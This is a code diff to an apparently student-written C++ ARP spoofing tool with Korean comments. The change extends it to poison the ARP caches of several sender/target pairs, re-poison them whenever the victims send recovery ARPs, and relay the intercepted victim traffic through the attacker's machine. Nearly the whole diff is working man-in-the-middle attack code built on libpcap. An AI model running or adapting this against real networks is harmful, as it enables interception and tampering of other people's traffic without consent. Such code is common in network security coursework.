@@ -14,6 +14,9 @@
 #include <net/if.h>
 #include <unistd.h>
 
+/* maping ip & mac */
+#include <map>
+
 typedef struct ARP_INFECTION_PACKET {
 	ETHERNET_HDR eth_h;
 	ARP_HDR arp_h;
@@ -55,6 +58,7 @@ void send_relay_packet(
 bool getMyMacAddress(const char* interface, char* mac_str);
 bool getMyIpAddress(const char* interface, char* ip_str);
 void print_packet(const u_char* packet, u_int32_t packet_len);
+std::string findKeyByValue(const std::map<std::string, std::string>& myMap, std::string value);
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2 != 0) {
@@ -70,25 +74,28 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+    std::map <std::string, std::string> ip_mac;
+    std::map <std::string, std::string> sender_target;
     /* my mac & ip */
 	char my_mac[18], my_ip[16];
 	getMyMacAddress(argv[1], my_mac);
 	getMyIpAddress(argv[1], my_ip);
-
+    
     /* sender & target mac + 최초 arp table 감염*/
-    char sender_mac[18], target_mac[18];
+    char sender_mac[18];
     for(int i = 2; i < argc; i += 2) {
         printf("----------\n");
         get_mac_address(pcap, argv[i], sender_mac, my_ip, my_mac);
-        get_mac_address(pcap, argv[i + 1], target_mac, my_ip, my_mac);
+        ip_mac[argv[i]] = sender_mac;
+        sender_target[argv[i]] = argv[i + 1];
 
         /* 최초로 위조 패킷 보내기 */
         arp_infection(pcap, argv[i], sender_mac, argv[i + 1], my_mac, my_ip);
-        arp_infection(pcap, argv[2 + 1], target_mac, argv[2], my_mac, my_ip);
         printf("----------\n");
     }
 
     /* sender에서 보낸 패킷 수신 */
+    char sender_ip[16], target_ip[16], src_mac[18];
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet;
@@ -102,10 +109,19 @@ int main(int argc, char* argv[]) {
 
         /* arp 복구 상황이 왔을 때 arp table 재감염 */
         if(eth->ether_type == htons(0x0806)) {
-            printf("-------------------\n");
-            printf("\nReceived ARP request or reply\nProtocol : %04x\n", ntohs(eth->ether_type));
-            arp_infection(pcap, argv[2], sender_mac, argv[2 + 1], my_mac, my_ip);
-            arp_infection(pcap, argv[2 + 1], target_mac, argv[2], my_mac, my_ip);
+            ARP_HDR *arp = (ARP_HDR *)(packet + sizeof(ETHERNET_HDR));
+
+            bytemac_to_stringmac(eth->ether_shost, src_mac);
+            byteip_to_stringip(&arp->sender_ip_address, sender_ip);
+            byteip_to_stringip(&arp->target_ip_address, target_ip);
+
+            printf("src mac : %s sender mac : %s\n",src_mac, ip_mac[sender_ip].c_str());
+
+            if (ip_mac.count(target_ip)){
+                printf("-------------------\n");
+                printf("\nReceived ARP request or reply\nProtocol : %04x\n", ntohs(eth->ether_type));
+                arp_infection(pcap, sender_ip, ip_mac[sender_ip].c_str(), target_ip, my_mac, my_ip);
+            }
             continue;
         }
 
@@ -122,16 +138,15 @@ int main(int argc, char* argv[]) {
         byteip_to_stringip(&(ipv4->ip_dst), dst_ip);
 
         /* spoofing packet이 맞는 경우 relay packet 생성 및 전송 */
-        if(strncmp(src_mac, sender_mac, 18) == 0 && strncmp(dst_mac, my_mac, 18) == 0 && strncmp(dst_ip, my_ip, 16) != 0) {
-            printf("-------------------\n");
-            printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
-            send_relay_packet(pcap, packet, header, eth, target_mac, my_mac);
-        }
-        /* spoofing packet이 맞는 경우 relay packet 생성 및 전송 */
-        if(strncmp(src_mac, target_mac, 18) == 0 && strncmp(dst_mac, my_mac, 18) == 0 && strncmp(dst_ip, argv[2], 16) == 0) {
-            printf("-------------------\n");
-            printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
-            send_relay_packet(pcap, packet, header, eth, sender_mac, my_mac);
+        if(strncmp(dst_mac, my_mac, 18) == 0 && strncmp(dst_ip, my_ip, 16) != 0) {
+            if(ip_mac.count(dst_ip)||ip_mac.count(src_ip)) {
+                printf("-------------------\n");
+                printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
+                if (ip_mac.count(src_ip))
+                    send_relay_packet(pcap, packet, header, eth, ip_mac[sender_target[src_ip]].c_str(), my_mac);
+                else
+                    send_relay_packet(pcap, packet, header, eth, ip_mac[dst_ip].c_str(), my_mac);
+            }
         }
         
 	}
@@ -262,15 +277,16 @@ void send_relay_packet(
     stringmac_to_bytemac(target_mac, infection_eth->ether_dhost);
     stringmac_to_bytemac(my_mac, infection_eth->ether_shost);
     infection_eth->ether_type = eth->ether_type;
-    print_ethernet(infection_eth);
 
     memcpy(infection_packet, infection_eth, sizeof(ETHERNET_HDR));
     memcpy(infection_packet + sizeof(ETHERNET_HDR), packet + sizeof(ETHERNET_HDR), header->caplen - sizeof(ETHERNET_HDR));
 
+    print_ethernet(infection_eth);
+
     if(pcap_sendpacket(pcap, infection_packet, header->caplen) != 0) {
         fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
     } else {
-        printf("Sent ARP packet from %s to %s\n", my_mac, target_mac);
+        printf("Sent relay packet\n(from %s to %s)\n", my_mac, target_mac);
     }
     delete infection_eth;
     delete[] infection_packet;
@@ -322,4 +338,13 @@ void print_packet(const u_char* packet, u_int32_t packet_len) {
 
     IPV4_HDR* ip = (IPV4_HDR*) (packet + sizeof(ETHERNET_HDR));
     print_ipv4(ip);
+}
+
+std::string findKeyByValue(const std::map<std::string, std::string>& myMap, std::string value) {
+    for (const auto& pair : myMap) {
+        if (pair.second == value) {
+            return pair.first;
+        }
+    }
+    return "";
 }
